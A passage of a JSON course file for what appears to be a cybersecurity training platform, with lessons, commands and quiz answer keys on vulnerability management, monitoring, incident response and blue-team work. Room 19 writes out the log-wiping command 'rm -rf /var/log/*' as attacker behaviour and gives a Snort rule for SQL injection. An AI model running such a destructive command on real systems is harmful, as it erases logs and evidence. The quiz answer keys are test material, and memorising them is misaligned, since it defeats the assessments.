        "guidedExercise": "Review and complete the guided exercise in the interactive sandbox.",
        "isFinalReview": true,
        "reviewSummary": {
          "mainConcepts": "Vulnerability management lifecycle (Discovery, Assessment, Prioritization, Remediation, Verification), CVSS vs EPSS, and patch verification.",
          "technicalTakeaways": "Scanning identifies potential vulnerabilities; EPSS and CISA KEV prioritize what to patch first. Always verify patches after deployment.",
          "commandsCovered": [
            "apt list --upgradable",
            "dpkg -l",
            "needrestart"
          ],
          "commonMistakes": "Treating vulnerability management as a one-time project instead of an ongoing continuous operational cycle.",
          "learningOutcome": "You can manage the vulnerability lifecycle, prioritize patches using EPSS, and verify security remediation."
        },
        "questions": [
          {
            "id": "q-18-3",
            "type": "multiple-choice",
            "question": "Which key technical concept best summarizes your learning in Vulnerability Management?",
            "options": [
              "Explain the continuous vulnerability management lifecycle",
              "Ignoring operating system permissions and error logs",
              "Executing unauthorized attacks against production networks without scope",
              "Using plaintext passwords on unencrypted networks"
            ],
            "correctIndex": 0,
            "hint": "Reflect on the primary learning objective of this room.",
            "explanation": "Understanding Explain the continuous vulnerability management lifecycle is the central takeaway of this room."
          }
        ]
      }
    ],
    "questions": [
      {
        "id": "q-18-1",
        "type": "multiple-choice",
        "question": "What is the primary difference between automated vulnerability scanning and manual penetration testing?",
        "options": [
          "Vulnerability scanning is illegal, while penetration testing is legal",
          "Vulnerability scanning identifies potential known flaws automatically without active exploitation, while penetration testing actively exploits vulnerabilities to demonstrate real-world impact",
          "Vulnerability scanning only checks hardware cables",
          "Penetration testing can only be performed by government agencies"
        ],
        "correctIndex": 1,
        "hint": "Scanning finds potential flaws; pentesting verifies real-world exploitability.",
        "explanation": "Scanning broadly identifies potential vulnerabilities; penetration testing manually validates and chains vulnerabilities to prove impact."
      },
      {
        "id": "q-18-2",
        "type": "exact",
        "question": "What data-driven scoring system calculates the probability (percentage) that a vulnerability will be exploited in the wild within 30 days?",
        "visualSlots": "_ _ _ _",
        "acceptedAnswers": [
          "EPSS",
          "Exploit Prediction Scoring System"
        ],
        "caseSensitive": false,
        "trimWhitespace": true,
        "hint": "Four-letter acronym starting with E.",
        "explanation": "EPSS (Exploit Prediction Scoring System) models real-world exploit probability to prioritize patching."
      },
      {
        "id": "q-18-3",
        "type": "multiple-choice",
        "question": "Which key technical concept best summarizes your learning in Vulnerability Management?",
        "options": [
          "Explain the continuous vulnerability management lifecycle",
          "Ignoring operating system permissions and error logs",
          "Executing unauthorized attacks against production networks without scope",
          "Using plaintext passwords on unencrypted networks"
        ],
        "correctIndex": 0,
        "hint": "Reflect on the primary learning objective of this room.",
        "explanation": "Understanding Explain the continuous vulnerability management lifecycle is the central takeaway of this room."
      }
    ],
    "tasks": [
      {
        "title": "Task 1: The Vulnerability Management Lifecycle",
        "instruction": "Check for pending security updates on your system.",
        "hints": [
          "Scanning finds potential flaws; pentesting verifies real-world exploitability."
        ]
      },
      {
        "title": "Task 2: Prioritization: CVSS vs EPSS",
        "instruction": "Inspect installed software versions to compare against vulnerability databases.",
        "hints": [
          "Four-letter acronym starting with E."
        ]
      },
      {
        "title": "Task 3: Remediation Verification & Final Review",
        "instruction": "Review and complete the guided exercise in the interactive sandbox.",
        "hints": [
          "Reflect on the primary learning objective of this room."
        ]
      }
    ],
    "nextRoomId": "room-19"
  },
  {
    "id": "room-19",
    "stageId": "cyber-security",
    "stageTitle": "Cyber Security Foundations",
    "stageOrder": 2,
    "stage": 2,
    "level": 2,
    "levelTitle": "Cyber Security Foundations",
    "roomNumber": 19,
    "title": "Security Monitoring Fundamentals",
    "description": "Explore enterprise security monitoring: telemetry collection, log aggregation, Intrusion Detection Systems (IDS/IPS), and SIEM integration.",
    "difficulty": "Foundational",
    "difficultyBadge": "Foundational",
    "estimatedTime": "35 mins",
    "xpReward": 50,
    "prerequisites": "room-18",
    "whyAreYouHere": "Explore enterprise security monitoring: telemetry collection, log aggregation, Intrusion Detection Systems (IDS/IPS), and SIEM integration.",
    "objectives": [
      "Explain the necessity of centralized log aggregation and security telemetry",
      "Differentiate Network IDS/IPS from Host-based IDS/IPS",
      "Analyze Snort and Suricata signature rule structures",
      "Understand the role of Security Information and Event Management (SIEM) systems"
    ],
    "skillsGained": [
      "Security Telemetry",
      "NIDS vs HIDS",
      "Snort / Suricata Rules",
      "SIEM Architecture"
    ],
    "toolsAndCommands": [
      "journalctl -xe",
      "tail -f /var/log/syslog",
      "grep -i 'error' /var/log/syslog"
    ],
    "lessons": [
      {
        "taskNumber": 1,
        "title": "Task 1: Telemetry Collection & Centralized Logging",
        "concept": "Attackers rely on stealth, operating on systems for an average of over 200 days (dwell time) before detection. **Security Monitoring** continuously observes networks, hosts, and applications to detect indicators of compromise (IoCs). Centralized logging is vital because:\n1. If an attacker compromises a host, the first action they take is clearing local logs (`rm -rf /var/log/*` or clearing Windows Event Logs)\n2. By shipping logs immediately over secure network streams (Syslog TLS, Fluentd, Winlogbeat) to an immutable central repository, forensic evidence is preserved permanently.",
        "whyItMatters": "Attackers cannot delete logs that have already been shipped to an external write-once logging server.",
        "examples": [
          "Local Log: Vulnerable to tampering by local root administrator",
          "Centralized Log: Secure, searchable archive indexed across thousands of servers"
        ],
        "commands": [
          {
            "cmd": "journalctl -n 20",
            "desc": "Display last 20 Linux systemd journal log entries"
          },
          {
            "cmd": "logger 'CALION Security Test Alert'",
            "desc": "Inject test log message into local syslog stream"
          }
        ],
        "guidedExercise": "Use logger to generate a custom security log event and verify its appearance with journalctl.",
        "isFinalReview": false,
        "reviewSummary": null,
        "questions": [
          {
            "id": "q-19-1",
            "type": "multiple-choice",
            "question": "Why is forwarding logs immediately to a centralized, immutable server critical for incident response?",
            "options": [
              "To make the local hard drive run faster",
              "Because an attacker who gains root access will attempt to wipe or modify local logs to hide their tracks",
              "Because centralized logs eliminate the need for firewalls",
              "To prevent the server from running out of electricity"
            ],
            "correctIndex": 1,
            "hint": "Attackers delete evidence on compromised machines.",
            "explanation": "Adversaries wipe local logs upon compromise; centralized streaming logs preserve immutable evidence for forensic analysis."
          }
        ]
      },
      {
        "taskNumber": 2,
        "title": "Task 2: Intrusion Detection (IDS) vs Intrusion Prevention (IPS)",
        "concept": "Security monitoring utilizes automated inspection sensors:\n- **Intrusion Detection System (IDS):** Passive monitoring sensor placed on a network TAP or SPAN/mirror port. Inspects packets, compares payloads against known signatures or behavioral baselines, and raises an **Alert** to security analysts. Zero latency impact on network traffic\n- **Intrusion Prevention System (IPS):** Active in-line sensor placed directly in the network traffic path. If malicious traffic matches a signature, the IPS **Drops** the packet immediately to prevent exploit execution.\nSensors operate either on network wire taps (**NIDS/NIPS** like Snort, Suricata, Zeek) or directly on individual endpoints (**HIDS/HIPS** like OSSEC, Wazuh).",
        "whyItMatters": "Signatures look for explicit exploit patterns, while anomaly-based detection flags deviations from normal baselines.",
        "examples": [
          "Snort Rule: `alert tcp any any -> $HOME_NET 80 (msg:\"SQLi attempt\"; content:\"UNION SELECT\"; sid:100001;)`",
          "IPS in-line: Drops packet containing reverse shell shellcode"
        ],
        "commands": [
          {
            "cmd": "tail -f /var/log/syslog",
            "desc": "Monitor system log stream in real time"
          }
        ],
        "guidedExercise": "Inspect how intrusion detection rules match specific byte strings and protocols.",
        "isFinalReview": false,
        "reviewSummary": null,
        "questions": [
          {
            "id": "q-19-2",
            "type": "exact",
            "question": "Which type of intrusion system is deployed directly in-line with network traffic to actively block and drop malicious packets?",
            "visualSlots": "_ _ _",
            "acceptedAnswers": [
              "IPS",
              "Intrusion Prevention System"
            ],
            "caseSensitive": false,
            "trimWhitespace": true,
            "hint": "Three-letter acronym for Intrusion Prevention System.",
            "explanation": "An IPS (Intrusion Prevention System) sits in-line to actively block detected attacks."
          }
        ]
      },
      {
        "taskNumber": 3,
        "title": "Task 3: SIEM & Security Operations Review",
        "concept": "A **Security Information and Event Management (SIEM)** platform (such as Splunk, Elastic SIEM, Microsoft Sentinel) aggregates logs from firewalls, servers, cloud APIs, and endpoints. The SIEM normalizes data into a unified schema and applies correlation rules (e.g. \"Alert if user fails login 5 times on VPN, then successfully logs in from another country within 10 minutes\").",
        "whyItMatters": "Correlation rules connect disjointed events across multiple servers into a unified attack narrative.",
        "examples": [
          "Correlation Rule: Failed SSH logins on 5 servers followed by sudo execution = Lateral Movement Alert"
        ],
        "commands": [
          {
            "cmd": "grep -i 'accepted' /var/log/auth.log 2>/dev/null || echo 'Checked auth stream'",
            "desc": "Search for successful authentication events"
          }
        ],
        "guidedExercise": "Review and complete the guided exercise in the interactive sandbox.",
        "isFinalReview": true,
        "reviewSummary": {
          "mainConcepts": "Centralized log aggregation, IDS (passive alert) vs IPS (active block), Snort rule mechanics, and SIEM correlation engines.",
          "technicalTakeaways": "Local logs can be wiped; centralized log pipelines preserve forensic truth. SIEM correlation rules detect distributed multi-stage attacks.",
          "commandsCovered": [
            "journalctl",
            "logger",
            "tail -f"
          ],
          "commonMistakes": "Assuming an IDS blocks attacks (an IDS only alerts; an IPS blocks).",
          "learningOutcome": "You can explain centralized security telemetry, differentiate IDS from IPS, and understand how SIEM correlation engines detect breaches."
        },
        "questions": [
          {
            "id": "q-19-3",
            "type": "multiple-choice",
            "question": "Which key technical concept best summarizes your learning in Security Monitoring Fundamentals?",
            "options": [
              "Explain the necessity of centralized log aggregation and security telemetry",
              "Ignoring operating system permissions and error logs",
              "Executing unauthorized attacks against production networks without scope",
              "Using plaintext passwords on unencrypted networks"
            ],
            "correctIndex": 0,
            "hint": "Reflect on the primary learning objective of this room.",
            "explanation": "Understanding Explain the necessity of centralized log aggregation and security telemetry is the central takeaway of this room."
          }
        ]
      }
    ],
    "questions": [
      {
        "id": "q-19-1",
        "type": "multiple-choice",
        "question": "Why is forwarding logs immediately to a centralized, immutable server critical for incident response?",
        "options": [
          "To make the local hard drive run faster",
          "Because an attacker who gains root access will attempt to wipe or modify local logs to hide their tracks",
          "Because centralized logs eliminate the need for firewalls",
          "To prevent the server from running out of electricity"
        ],
        "correctIndex": 1,
        "hint": "Attackers delete evidence on compromised machines.",
        "explanation": "Adversaries wipe local logs upon compromise; centralized streaming logs preserve immutable evidence for forensic analysis."
      },
      {
        "id": "q-19-2",
        "type": "exact",
        "question": "Which type of intrusion system is deployed directly in-line with network traffic to actively block and drop malicious packets?",
        "visualSlots": "_ _ _",
        "acceptedAnswers": [
          "IPS",
          "Intrusion Prevention System"
        ],
        "caseSensitive": false,
        "trimWhitespace": true,
        "hint": "Three-letter acronym for Intrusion Prevention System.",
        "explanation": "An IPS (Intrusion Prevention System) sits in-line to actively block detected attacks."
      },
      {
        "id": "q-19-3",
        "type": "multiple-choice",
        "question": "Which key technical concept best summarizes your learning in Security Monitoring Fundamentals?",
        "options": [
          "Explain the necessity of centralized log aggregation and security telemetry",
          "Ignoring operating system permissions and error logs",
          "Executing unauthorized attacks against production networks without scope",
          "Using plaintext passwords on unencrypted networks"
        ],
        "correctIndex": 0,
        "hint": "Reflect on the primary learning objective of this room.",
        "explanation": "Understanding Explain the necessity of centralized log aggregation and security telemetry is the central takeaway of this room."
      }
    ],
    "tasks": [
      {
        "title": "Task 1: Telemetry Collection & Centralized Logging",
        "instruction": "Use logger to generate a custom security log event and verify its appearance with journalctl.",
        "hints": [
          "Attackers delete evidence on compromised machines."
        ]
      },
      {
        "title": "Task 2: Intrusion Detection (IDS) vs Intrusion Prevention (IPS)",
        "instruction": "Inspect how intrusion detection rules match specific byte strings and protocols.",
        "hints": [
          "Three-letter acronym for Intrusion Prevention System."
        ]
      },
      {
        "title": "Task 3: SIEM & Security Operations Review",
        "instruction": "Review and complete the guided exercise in the interactive sandbox.",
        "hints": [
          "Reflect on the primary learning objective of this room."
        ]
      }
    ],
    "nextRoomId": "room-20"
  },
  {
    "id": "room-20",
    "stageId": "cyber-security",
    "stageTitle": "Cyber Security Foundations",
    "stageOrder": 2,
    "stage": 2,
    "level": 2,
    "levelTitle": "Cyber Security Foundations",
    "roomNumber": 20,
    "title": "Introduction to Incident Response",
    "description": "Master the emergency management of cybersecurity: the NIST/SANS Incident Response lifecycle, containment strategies, and evidence preservation.",
    "difficulty": "Foundational",
    "difficultyBadge": "Foundational",
    "estimatedTime": "35 mins",
    "xpReward": 50,
    "prerequisites": "room-19",
    "whyAreYouHere": "Master the emergency management of cybersecurity: the NIST/SANS Incident Response lifecycle, containment strategies, and evidence preservation.",
    "objectives": [
      "Memorize the 6 phases of the Incident Response lifecycle (NIST SP 800-61 / SANS)",
      "Implement initial triage, containment, and network isolation strategies",
      "Differentiate eradication from recovery and business continuity",
      "Conduct post-incident reviews (Lessons Learned) to strengthen defense"
    ],
    "skillsGained": [
      "NIST IR Lifecycle",
      "Triage & Containment",
      "Evidence Preservation",
      "Lessons Learned"
    ],
    "toolsAndCommands": [
      "netstat -anp",
      "ps aux --forest",
      "tar -czf",
      "sha256sum"
    ],
    "lessons": [
      {
        "taskNumber": 1,
        "title": "Task 1: The Incident Response Lifecycle (NIST & SANS)",
        "concept": "When a security breach occurs, chaos must be replaced with structured execution. The **Incident Response Lifecycle** (standardized by NIST SP 800-61 and SANS) consists of six ordered phases:\n1. **Preparation:** Form the incident response team (CSIRT), establish communication channels, deploy endpoint sensors, and maintain verified offline backups\n2. **Identification (Triage):** Detect anomalous activity, analyze alerts, determine scope, and verify whether the event is a false positive or true security incident\n3. **Containment:** Stop the bleeding. Prevent the adversary from expanding their foothold without destroying evidence (short-term containment: isolate host from network; long-term: apply firewall rules)\n4. **Eradication:** Locate and remove all adversary artifacts, malware backdoors, compromised credentials, and persistence mechanisms across all systems\n5. **Recovery:** Restore systems from clean backups, test functionality, reset credentials, and monitor closely for reinfection\n6. **Lessons Learned:** Meet within two weeks to document what happened, why it happened, how response performed, and what security controls must be improved.",
        "whyItMatters": "Skipping the Lessons Learned phase guarantees that the organization will fall victim to the exact same attack vector again.",
        "examples": [
          "Preparation: Incident playbooks, call trees, forensic jump bags",
          "Containment: Disconnecting Ethernet cable or isolating host via EDR while leaving power ON to preserve RAM",
          "Eradication: Re-imaging compromised operating systems from gold master images"
        ],
        "commands": [
          {
            "cmd": "ps aux --forest",
            "desc": "Display process tree hierarchy to identify malicious child processes spawned by services"
          }
        ],
        "guidedExercise": "Inspect process tree relationships to trace parent-child execution lineages.",
        "isFinalReview": false,
        "reviewSummary": null,
        "questions": [
          {
            "id": "q-20-1",
            "type": "multiple-choice",
            "question": "What is the primary objective of the Containment phase in the Incident Response lifecycle?",
            "options": [
              "To purchase new server hardware",
              "To stop the attacker from expanding laterally or exfiltrating data, while preserving critical forensic evidence",
              "To format all hard drives immediately without analyzing them",
              "To inform the media before verifying if a breach occurred"
            ],
            "correctIndex": 1,
            "hint": "Limit the blast radius and stop the attack from spreading.",
            "explanation": "Containment limits the scope and impact of the incident, preventing lateral movement and exfiltration while preserving evidence."
          }
        ]
      },
      {
        "taskNumber": 2,
        "title": "Task 2: Evidence Preservation & Order of Volatility",
        "concept": "During incident response, handling evidence properly is paramount for legal prosecution and root cause analysis. First responders must respect the **Order of Volatility**\u2014capturing the most ephemeral data before it vanishes:\n1. CPU Registers and Cache (disappears in nanoseconds)\n2. Routing table, ARP cache, active process table, kernel statistics in RAM (lost on power-off)\n3. Temporary filesystems (`/tmp`, swap/pagefile)\n4. Persistent disk storage (hard drives, SSDs)\n5. Remote logs and archival backups.\n**Rule of Thumb:** Never immediately power off a compromised machine; pulling the plug wipes volatile RAM and destroys active malware keys.",
        "whyItMatters": "Powering down a system destroys RAM contents, eliminating encryption keys and in-memory malware artifacts.",
        "examples": [
          "RAM Capture: Using LiME or DumpIt to dump memory to external USB",
          "Chain of Custody: Rigorous documentation detailing who collected, handled, and analyzed evidence"
        ],
        "commands": [
          {
            "cmd": "arp -n",
            "desc": "Inspect volatile Layer 2 ARP cache table"
          },
          {
            "cmd": "netstat -rn",
            "desc": "Inspect active kernel routing table"
          }
        ],
        "guidedExercise": "Inspect volatile networking tables before they decay.",
        "isFinalReview": false,
        "reviewSummary": null,
        "questions": [
          {
            "id": "q-20-2",
            "type": "exact",
            "question": "What legal documentation tracks every individual who collected, accessed, transported, and analyzed forensic evidence?",
            "visualSlots": "_ _ _ _ _   _ _   _ _ _ _ _ _ _",
            "acceptedAnswers": [
              "chain of custody",
              "chain-of-custody"
            ],
            "caseSensitive": false,
            "trimWhitespace": true,
            "hint": "Chain of ...",
            "explanation": "The Chain of Custody preserves legal admissibility by proving evidence was not tampered with."
          }
        ]
      },
      {
        "taskNumber": 3,
        "title": "Task 3: Cyber Security Foundations Capstone Review",
        "concept": "Congratulations on completing Stage 2 (Cyber Security Foundations)! You now possess a comprehensive grasp of security principles, threat modeling, authentication, cryptography, malware taxonomy, architecture, vulnerability management, monitoring, and incident response.\nNow, the learning tree branches into two specialized operational paths:\n- **Stage 3: Defensive Security (Blue Team):** Deep dive into SOC operations, log analysis, SIEM engineering, network forensics, and live threat hunting.\n- **Stage 4: Offensive Security (Red Team):** Deep dive into ethical hacking, reconnaissance, network/service enumeration, web vulnerability assessment, and privilege escalation.",
        "whyItMatters": "Choose your path or conquer both: true cybersecurity experts understand both offense and defense.",
        "examples": [
          "Blue Team: Protect, monitor, investigate, and remediate",
          "Red Team: Emulate adversaries, discover vulnerabilities, and test defenses"
        ],
        "commands": [
          {
            "cmd": "echo 'Stage 2 Complete! Pathways Unlocked.'",
            "desc": "Celebrate unlocking Stage 3 and Stage 4 Specializations"
          }
        ],
        "guidedExercise": "Review and complete the guided exercise in the interactive sandbox.",
        "isFinalReview": true,
        "reviewSummary": {
          "mainConcepts": "NIST/SANS 6-phase Incident Response lifecycle, containment techniques, Order of Volatility, and Chain of Custody.",
          "technicalTakeaways": "Never power off a compromised machine immediately; volatile RAM holds critical evidence. Containment stops bleeding before eradication.",
          "commandsCovered": [
            "ps aux --forest",
            "arp -n",
            "netstat -rn"
          ],
          "commonMistakes": "Rebooting or pulling the power plug on a compromised machine, destroying all volatile forensic memory.",
          "learningOutcome": "You can execute the Incident Response lifecycle, prioritize evidence preservation by volatility, and prepare for Blue or Red Team specialization."
        },
        "questions": [
          {
            "id": "q-20-3",
            "type": "multiple-choice",
            "question": "Which key technical concept best summarizes your learning in Introduction to Incident Response?",
            "options": [
              "Memorize the 6 phases of the Incident Response lifecycle (NIST SP 800-61 / SANS)",
              "Ignoring operating system permissions and error logs",
              "Executing unauthorized attacks against production networks without scope",
              "Using plaintext passwords on unencrypted networks"
            ],
            "correctIndex": 0,
            "hint": "Reflect on the primary learning objective of this room.",
            "explanation": "Understanding Memorize the 6 phases of the Incident Response lifecycle (NIST SP 800-61 / SANS) is the central takeaway of this room."
          }
        ]
      }
    ],
    "questions": [
      {
        "id": "q-20-1",
        "type": "multiple-choice",
        "question": "What is the primary objective of the Containment phase in the Incident Response lifecycle?",
        "options": [
          "To purchase new server hardware",
          "To stop the attacker from expanding laterally or exfiltrating data, while preserving critical forensic evidence",
          "To format all hard drives immediately without analyzing them",
          "To inform the media before verifying if a breach occurred"
        ],
        "correctIndex": 1,
        "hint": "Limit the blast radius and stop the attack from spreading.",
        "explanation": "Containment limits the scope and impact of the incident, preventing lateral movement and exfiltration while preserving evidence."
      },
      {
        "id": "q-20-2",
        "type": "exact",
        "question": "What legal documentation tracks every individual who collected, accessed, transported, and analyzed forensic evidence?",
        "visualSlots": "_ _ _ _ _   _ _   _ _ _ _ _ _ _",
        "acceptedAnswers": [
          "chain of custody",
          "chain-of-custody"
        ],
        "caseSensitive": false,
        "trimWhitespace": true,
        "hint": "Chain of ...",
        "explanation": "The Chain of Custody preserves legal admissibility by proving evidence was not tampered with."
      },
      {
        "id": "q-20-3",
        "type": "multiple-choice",
        "question": "Which key technical concept best summarizes your learning in Introduction to Incident Response?",
        "options": [
          "Memorize the 6 phases of the Incident Response lifecycle (NIST SP 800-61 / SANS)",
          "Ignoring operating system permissions and error logs",
          "Executing unauthorized attacks against production networks without scope",
          "Using plaintext passwords on unencrypted networks"
        ],
        "correctIndex": 0,
        "hint": "Reflect on the primary learning objective of this room.",
        "explanation": "Understanding Memorize the 6 phases of the Incident Response lifecycle (NIST SP 800-61 / SANS) is the central takeaway of this room."
      }
    ],
    "tasks": [
      {
        "title": "Task 1: The Incident Response Lifecycle (NIST & SANS)",
        "instruction": "Inspect process tree relationships to trace parent-child execution lineages.",
        "hints": [
          "Limit the blast radius and stop the attack from spreading."
        ]
      },
      {
        "title": "Task 2: Evidence Preservation & Order of Volatility",
        "instruction": "Inspect volatile networking tables before they decay.",
        "hints": [
          "Chain of ..."
        ]
      },
      {
        "title": "Task 3: Cyber Security Foundations Capstone Review",
        "instruction": "Review and complete the guided exercise in the interactive sandbox.",
        "hints": [
          "Reflect on the primary learning objective of this room."
        ]
      }
    ],
    "nextRoomId": "room-21"
  },
  {
    "id": "room-21",
    "stageId": "defensive-security",
    "stageTitle": "Defensive Security",
    "stageOrder": 3,
    "stage": 3,
    "level": 3,
    "levelTitle": "Defensive Security",
    "roomNumber": 21,
    "title": "Introduction to Blue Team Operations",
    "description": "Enter the world of enterprise defense: the blue team mission, defending business assets, and operational threat hunting.",
    "difficulty": "Intermediate",
    "difficultyBadge": "Intermediate",
    "estimatedTime": "35 mins",
    "xpReward": 50,
    "prerequisites": "room-20",
    "whyAreYouHere": "Enter the world of enterprise defense: the blue team mission, defending business assets, and operational threat hunting.",
    "objectives": [
      "Define the core mission and mindset of the Blue Team",
      "Understand enterprise defense telemetry streams and asset shielding",
      "Map defender workflows across preventive, detective, and responsive controls",
      "Differentiate passive monitoring from active threat hunting"
    ],
    "skillsGained": [
      "Blue Team Operations",
      "Detective Controls",
      "Telemetry Streams",
      "Threat Hunting"
    ],
    "toolsAndCommands": [
      "auditctl -s",
      "systemctl status",
      "journalctl -u ssh",
      "ss -tulpn"
    ],
    "lessons": [
      {
        "taskNumber": 1,
        "title": "Task 1: The Blue Team Mission & Defense Mindset",
        "concept": "The **Blue Team** is responsible for maintaining internal cyber defenses and responding to incidents. Unlike attackers, who only need to find a single unpatched flaw or weak credential (the asymmetric advantage of the attacker), defenders must protect every asset, user, and network path 24/7/365. To overcome this asymmetry, blue teams implement defense in depth, assume breach, and leverage threat intelligence to anticipate adversary tactics before attacks manifest.",
        "whyItMatters": "Defenders shift from reactive alert firefighting to proactive threat hunting to uncover hidden intrusions.",
        "examples": [
          "Preventive Controls: Firewalls, MFA, patch cycles, least privilege",
          "Detective Controls: SIEM alerts, EDR behavioral heuristics, network IDS",
          "Responsive Controls: Host isolation, credential revocation, playbook execution"
        ],
        "commands": [
          {
            "cmd": "systemctl list-units --type=service --state=running",
            "desc": "Audit running system services to understand baseline enterprise workloads"
          }
        ],
        "guidedExercise": "Review currently running system services to establish a defensive operational baseline.",
        "isFinalReview": false,
        "reviewSummary": null,
        "questions": [
          {
            "id": "q-21-1",
            "type": "multiple-choice",
            "question": "What is the primary operational mission of a cybersecurity Blue Team?",
            "options": [
              "To discover zero-day exploits and sell them on dark web forums",
              "To defend enterprise digital assets, detect unauthorized adversary actions, and rapidly respond to contain incidents",
              "To bypass physical door locks and steal employee laptops",
              "To develop web marketing campaigns for clients"
            ],
            "correctIndex": 1,
            "hint": "Defend, detect, and respond.",
            "explanation": "The Blue Team is dedicated to defending organizational assets, detecting threats, and executing incident response."
          }
        ]
      },
      {
        "taskNumber": 2,
        "title": "Task 2: Proactive Threat Hunting vs Passive Monitoring",
        "concept": "Traditional SOC operations are **passive**: analysts wait for an alert to fire in the SIEM before investigating. In contrast, **Threat Hunting** is proactive and iterative: assuming adversaries have already bypassed automated alerts, hunters formulate a hypothesis based on threat intelligence (e.g. 'A threat actor is using scheduled tasks for persistence') and search raw telemetry across thousands of endpoints to locate stealthy footholds.",
        "whyItMatters": "Threat hunting uncovers dwell-time intrusions that triggered no automated alarms.",
        "examples": [
          "Hypothesis: Adversaries are dumping LSASS process memory using procdump",
          "Hunt: Query endpoint telemetry for any non-system process accessing lsass.exe handle"
        ],
        "commands": [
          {
            "cmd": "journalctl -u ssh --since '1 hour ago'",
            "desc": "Hunt for anomalous SSH connection attempts over the past hour"
          }
        ],
        "guidedExercise": "Execute a basic hunt query in the authentication log stream.",
        "isFinalReview": false,
        "reviewSummary": null,
        "questions": [
          {
            "id": "q-21-2",
            "type": "exact",
            "question": "What proactive security practice involves iteratively searching networks and endpoints for undetected threats without waiting for an alert?",
            "visualSlots": "_ _ _ _ _ _   _ _ _ _ _ _ _",
            "acceptedAnswers": [
              "threat hunting",
              "threat-hunting"
            ],
            "caseSensitive": false,
            "trimWhitespace": true,
            "hint": "Hunting for threats.",
            "explanation": "Threat Hunting actively searches environment telemetry to detect stealthy adversaries."
          }
        ]
      },
      {
        "taskNumber": 3,
        "title": "Task 3: Blue Team Operations Review",
        "concept": "Defense is an ongoing operational discipline combining continuous telemetry, rapid alert triage, and proactive hypothesis-driven hunting.",
        "whyItMatters": "Building tight collaboration between detection engineers and threat hunters keeps defenses resilient.",
        "examples": [
          "Continuous validation: Purple teaming tests defenses with real adversary techniques"
        ],
        "commands": [
          {
            "cmd": "uptime",
            "desc": "Check operational system status"
          }
        ],
        "guidedExercise": "Review and complete the guided exercise in the interactive sandbox.",
        "isFinalReview": true,
        "reviewSummary": {
          "mainConcepts": "The Blue Team mission, the asymmetric defender challenge, preventive vs detective controls, and proactive threat hunting.",
          "technicalTakeaways": "Passive monitoring waits for alerts; threat hunting proactively tests hypotheses against raw endpoint telemetry.",
          "commandsCovered": [
            "systemctl list-units",
            "journalctl -u ssh"
          ],
          "commonMistakes": "Believing automated security tools eliminate the need for human threat hunters.",
          "learningOutcome": "You can describe the blue team operational mission and formulate basic threat hunting hypotheses."
        },
        "questions": [
          {
            "id": "q-21-3",
            "type": "multiple-choice",
            "question": "Which key technical concept best summarizes your learning in Introduction to Blue Team Operations?",
            "options": [
              "Define the core mission and mindset of the Blue Team",
              "Ignoring operating system permissions and error logs",
              "Executing unauthorized attacks against production networks without scope",
              "Using plaintext passwords on unencrypted networks"
            ],
            "correctIndex": 0,
            "hint": "Reflect on the primary learning objective of this room.",
            "explanation": "Understanding Define the core mission and mindset of the Blue Team is the central takeaway of this room."
          }
        ]
      }
    ],
    "questions": [
      {
        "id": "q-21-1",
        "type": "multiple-choice",
        "question": "What is the primary operational mission of a cybersecurity Blue Team?",
        "options": [
          "To discover zero-day exploits and sell them on dark web forums",
          "To defend enterprise digital assets, detect unauthorized adversary actions, and rapidly respond to contain incidents",
          "To bypass physical door locks and steal employee laptops",
          "To develop web marketing campaigns for clients"
        ],
        "correctIndex": 1,
        "hint": "Defend, detect, and respond.",
        "explanation": "The Blue Team is dedicated to defending organizational assets, detecting threats, and executing incident response."
      },
      {
        "id": "q-21-2",
        "type": "exact",
        "question": "What proactive security practice involves iteratively searching networks and endpoints for undetected threats without waiting for an alert?",
        "visualSlots": "_ _ _ _ _ _   _ _ _ _ _ _ _",
        "acceptedAnswers": [
          "threat hunting",
          "threat-hunting"
        ],
        "caseSensitive": false,
        "trimWhitespace": true,
        "hint": "Hunting for threats.",
        "explanation": "Threat Hunting actively searches environment telemetry to detect stealthy adversaries."
      },
      {
        "id": "q-21-3",
        "type": "multiple-choice",
        "question": "Which key technical concept best summarizes your learning in Introduction to Blue Team Operations?",
        "options": [
          "Define the core mission and mindset of the Blue Team",
          "Ignoring operating system permissions and error logs",
          "Executing unauthorized attacks against production networks without scope",
          "Using plaintext passwords on unencrypted networks"
        ],
        "correctIndex": 0,
        "hint": "Reflect on the primary learning objective of this room.",
        "explanation": "Understanding Define the core mission and mindset of the Blue Team is the central takeaway of this room."
      }
    ],
    "tasks": [
      {
        "title": "Task 1: The Blue Team Mission & Defense Mindset",
        "instruction": "Review currently running system services to establish a defensive operational baseline.",
        "hints": [
          "Defend, detect, and respond."
        ]
      },
      {
        "title": "Task 2: Proactive Threat Hunting vs Passive Monitoring",
        "instruction": "Execute a basic hunt query in the authentication log stream.",
        "hints": [
          "Hunting for threats."
        ]
      },
      {
        "title": "Task 3: Blue Team Operations Review",
        "instruction": "Review and complete the guided exercise in the interactive sandbox.",
        "hints": [
          "Reflect on the primary learning objective of this room."
        ]
      }
    ],
    "nextRoomId": "room-22"
  },
  {
    "id": "room-22",
    "stageId": "defensive-security",
    "stageTitle": "Defensive Security",
    "stageOrder": 3,
    "stage": 3,
    "level": 3,
    "levelTitle": "Defensive Security",
    "roomNumber": 22,
    "title": "Security Operations Centre Fundamentals",
    "description": "Explore the engine room of enterprise defense: SOC tiers (Tier 1, Tier 2, Tier 3), alert triage, escalation workflows, and SLA metrics.",
    "difficulty": "Intermediate",
    "difficultyBadge": "Intermediate",
    "estimatedTime": "35 mins",
    "xpReward": 50,
    "prerequisites": "room-21",
    "whyAreYouHere": "Explore the engine room of enterprise defense: SOC tiers (Tier 1, Tier 2, Tier 3), alert triage, escalation workflows, and SLA metrics.",
    "objectives": [
      "Analyze SOC tier structures: Tier 1 Triage, Tier 2 Incident Responder, Tier 3 Threat Hunter",
      "Execute structured alert triage and false positive elimination",
      "Understand Mean Time to Detect (MTTD) and Mean Time to Respond (MTTR)",
      "Operate ticket escalation matrices and shift handovers"
    ],
    "skillsGained": [
      "SOC Tier Hierarchy",
      "Alert Triage Workflows",
      "MTTD & MTTR Metrics",
      "Escalation Playbooks"
    ],
    "toolsAndCommands": [
      "grep -c 'Failed' /var/log/auth.log",
      "tail -n 50 /var/log/syslog"
    ],
    "lessons": [
      {
        "taskNumber": 1,
        "title": "Task 1: The SOC Tier Hierarchy & Alert Lifecycle",
